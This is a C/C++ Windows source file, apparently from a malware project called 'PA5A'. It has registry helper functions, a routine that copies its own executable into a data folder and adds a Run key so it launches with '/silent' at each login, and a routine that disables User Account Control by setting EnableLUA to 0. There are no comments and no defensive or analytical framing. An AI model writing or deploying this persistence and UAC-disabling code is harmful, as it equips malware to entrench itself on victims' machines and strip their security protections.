
#include "pa5a.hpp"

EXTERN_C_START

/********************************************************************************************************************************************************/
BOOL SetRegistryKeyStringValue(LPCWSTR key, LPCWSTR name, LPCWSTR data)
{
    HKEY regKey;
    if (RegOpenKey(HKEY_CURRENT_USER, key, &regKey) != ERROR_SUCCESS)
        return FALSE;

    if (regKey == NULL)
    {
        RegCloseKey(regKey);
        return FALSE;
    }

    if (RegSetValueEx(regKey, name, 0, REG_SZ, (LPBYTE)data, (wcslen(data) + 1) * sizeof(WCHAR)) != ERROR_SUCCESS)
    {
        RegCloseKey(regKey);
        return FALSE;
    }

    RegCloseKey(regKey);
    return TRUE;
}
/********************************************************************************************************************************************************/
BOOL SetRegistryKeyDwordValue(LPCWSTR key, LPCWSTR name, DWORD data)
{
    HKEY regKey;
    if (RegOpenKey(HKEY_LOCAL_MACHINE, key, &regKey) != ERROR_SUCCESS)
        return FALSE;

    if (regKey == NULL)
    {
        RegCloseKey(regKey);
        return FALSE;
    }

    if (RegSetValueEx(regKey, name, 0, REG_DWORD, (LPBYTE)&data, sizeof(DWORD)) != ERROR_SUCCESS)
    {
        RegCloseKey(regKey);
        return FALSE;
    }

    RegCloseKey(regKey);
    return TRUE;
}
/********************************************************************************************************************************************************/
BOOL SetPersistence()
{
    LPCWSTR persistenceRegistryKey = L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";
    LPCWSTR appName = L"PA5A";
    WCHAR myFilename[PATH_SIZE] = { 0 };
    WCHAR persistenceFilename[PATH_SIZE] = { 0 };
    WCHAR commandInRegistry[PATH_SIZE * 2] = { 0 };

    if (!GetModuleFileName(NULL, myFilename, sizeof(myFilename)))
        return FALSE;

    if (StringCbPrintf(persistenceFilename, sizeof(persistenceFilename), L"%s%s", DATA_FOLDER_W, EXECUTABLE_FILE_W) != S_OK)
        return FALSE;

    if (StrCmp(myFilename, persistenceFilename))
    {
        CreateDirectoryW(DATA_FOLDER_W, NULL);
        CopyFile(myFilename, persistenceFilename, FALSE);
    }

    if (StringCbPrintf(commandInRegistry, sizeof(commandInRegistry), L"%s /silent", persistenceFilename) != S_OK)
        return FALSE;

    if (SetRegistryKeyStringValue(persistenceRegistryKey, appName, commandInRegistry) == FALSE)
        return FALSE;

    return TRUE;
}
/********************************************************************************************************************************************************/
BOOL DisableUac()
{
    LPCWSTR persistenceRegistryKey = L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System";
    LPCWSTR valueName = L"EnableLUA";

    if (SetRegistryKeyDwordValue(persistenceRegistryKey, valueName, 0) == FALSE)
        return FALSE;

    return TRUE;
}

EXTERN_C_END